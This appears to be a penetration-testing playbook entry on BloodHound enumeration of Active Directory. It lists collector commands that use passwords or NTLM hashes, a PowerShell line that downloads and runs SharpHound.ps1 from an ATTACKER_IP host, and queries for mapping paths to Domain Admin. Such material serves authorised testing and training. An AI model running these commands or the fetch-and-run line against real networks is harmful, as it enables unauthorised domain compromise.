---
id: bloodhound
title: BloodHound Enumeration
stage: privesc
tags: [windows, ad]
tools:
  - bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All
  - SharpHound.exe -c All --zipfilename loot.zip
leads_to:
  - acl-abuse
  - adcs-esc1
  - adcs-esc4
  - dcsync
  - kerberoast
---

## Collect (from Linux — no agent needed)

```bash
bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All
bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All --zip
bloodhound-python -u 'account$' -hashes ':NTLM_HASH' -d $DOMAIN -dc $DC_IP -c All
```

## Collect (from Windows)

```powershell
.\SharpHound.exe -c All --zipfilename loot.zip
.\SharpHound.exe -c All,GPOLocalGroup

# PowerShell version
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
```

## Start BloodHound

```bash
sudo neo4j start
bloodhound
# Import zip
```

## Step 1 — Mark Owned Nodes

```
Right-click every account and machine you control → "Mark as Owned"
```

## Step 2 — Run Queries in Order

```
Analysis → Pre-Built Queries:
1. Find Shortest Paths to Domain Admins       ← always first
2. Shortest Paths from Owned Principals       ← YOUR path from your current position
3. Find Computers where Domain Users are LA   ← easy lateral move
4. Find Computers where Domain Users can RDP
5. Find Kerberoastable Users
6. Find AS-REP Roastable Users
7. Find Principals with DCSync Rights         ← check if you already have this
```

## Step 3 — Read Every Node You Land On

```
Click node → Node Info:
- Outbound Object Control  → ACLs this user has over other objects
- Local Admin Rights       → machines this user is local admin on
- Reachable High Value     → path to DA from this node
- Sessions                 → who is currently logged into this machine
```

## Notes

Run BloodHound BEFORE Kerberoasting, BEFORE Certipy, BEFORE anything else once you have valid creds. BloodHound is the map — everything else is following the map. The gMSA chain, LAPS passwords, ACL paths — none of that is visible until you run this.
